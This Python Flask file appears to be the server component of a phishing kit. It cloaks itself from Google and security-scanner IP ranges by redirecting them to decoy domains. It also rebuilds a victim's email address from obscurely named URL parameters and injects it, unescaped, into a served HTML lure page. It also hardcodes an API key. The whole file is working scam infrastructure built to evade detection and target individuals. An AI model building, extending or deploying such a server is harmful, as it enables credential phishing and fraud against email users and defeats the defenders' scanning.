from flask import Flask, request, redirect, send_file
import random
import requests
import re  # For email validation

app = Flask(__name__)

# Your Google Safe Browsing API key
API_KEY = 'AIzaSyDyOPmvplb1WtijK21xb4ApvRZwCxtsA18'
# Path to the raw HTML template
RAW_HTML_FILE_PATH = 'templates/raw.html'
# Path to the final index HTML file
INDEX_HTML_FILE_PATH = 'index.html'
# Path to the file containing redirect URLs
REDIRECT_URLS_FILE_PATH = 'redirecturls.txt'


# Function to update the raw HTML file with the Base64-encoded safe link
def update_html_with_av_pv(raw_html_file, index_html_file, iav, ipv):
    with open(raw_html_file, 'r') as raw_file:
        raw_html = raw_file.read()

    updated_html = raw_html.replace("[[av]]", iav).replace("[[pv]]", ipv)

    # Write to index.html (overwrites the existing file if present)
    with open(index_html_file, 'w') as index_file:
        index_file.write(updated_html)


# Function to get a random redirect URL from the file
def get_random_redirect_url(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines()]
    return random.choice(urls) if urls else None


def is_valid_email(email):
    # Simple regex to validate email format
    email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(email_regex, email) is not None


bannedIP = [
    r"^66\.102\..*", r"^38\.100\..*", r"^107\.170\..*", r"^149\.20\..*", r"^38\.105\..*",
    r"^74\.125\..*", r"^66\.150\.14\..*", r"^54\.176\..*", r"^184\.173\..*", r"^66\.249\..*",
    r"^128\.242\..*", r"^72\.14\.192\..*", r"^208\.65\.144\..*", r"^209\.85\.128\..*",
    r"^216\.239\.32\..*", r"^207\.126\.144\..*", r"^173\.194\..*", r"^64\.233\.160\..*",
    r"^194\.52\.68\..*", r"^194\.72\.238\..*", r"^62\.116\.207\..*", r"^212\.50\.193\..*",
    r"^69\.65\..*", r"^50\.7\..*", r"^131\.212\..*", r"^46\.116\..*", r"^62\.90\..*",
    r"^89\.138\..*", r"^82\.166\..*", r"^85\.64\..*", r"^93\.172\..*", r"^109\.186\..*",
    r"^194\.90\..*", r"^212\.29\.192\..*", r"^212\.235\..*", r"^217\.132\..*", r"^50\.97\..*",
    r"^209\.85\..*", r"^66\.205\.64\..*", r"^204\.14\.48\..*", r"^64\.27\.2\..*", r"^67\.15\..*",
    r"^202\.108\.252\..*", r"^193\.47\.80\..*", r"^64\.62\.136\..*", r"^66\.221\..*",
    r"^198\.54\..*", r"^192\.115\.134\..*", r"^216\.252\.167\..*", r"^193\.253\.199\..*",
    r"^69\.61\.12\..*", r"^64\.37\.103\..*", r"^38\.144\.36\..*", r"^64\.124\.14\..*",
    r"^206\.28\.72\..*", r"^209\.73\.228\..*", r"^158\.108\..*", r"^168\.188\..*",
    r"^66\.207\.120\..*", r"^167\.24\..*", r"^192\.118\.48\..*", r"^67\.209\.128\..*",
    r"^12\.148\.209\..*", r"^198\.25\..*", r"^64\.106\.213\..*"
]

# Function to check if the incoming IP matches any banned IP pattern
def is_ip_banned(ip):
    for pattern in bannedIP:
        if re.match(pattern, ip):
            return True
    return False

@app.before_request
def block_ip():
    # Get the client IP address from X-Forwarded-For or fallback to remote_addr
    if request.headers.getlist("X-Forwarded-For"):
        # Split the 'X-Forwarded-For' string to extract the first IP address
        requester_ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        requester_ip = request.remote_addr

    # Check if the requester's IP is in the blocked IP ranges
    if is_ip_banned(requester_ip):
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)



@app.route('/')
def check_links_and_serve():
    # Retrieve 'trexxcoz' and 'coztrexx' parameters from URL
    ipv = request.args.get('wE657UyRfVtO')
    iav = request.args.get('VfDbGdT4R4ErD54tR1DtR')
    if not ipv or not iav:
        # If parameters are missing, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # Construct the email address from the decoded parameters
    vmail = f"{iav}@{ipv}"

    # Validate the constructed email
    if not is_valid_email(vmail):
        # If the email is not valid, redirect to REDIRECT_URL
        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
        REDIRECT_URL = 'https://' + 'www.' + random_domain
        return redirect(REDIRECT_URL)

    # Corrected syntax: missing colon at the end of the 'else' statement
    else:
        update_html_with_av_pv(RAW_HTML_FILE_PATH, INDEX_HTML_FILE_PATH, iav, ipv)
        return send_file(INDEX_HTML_FILE_PATH)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
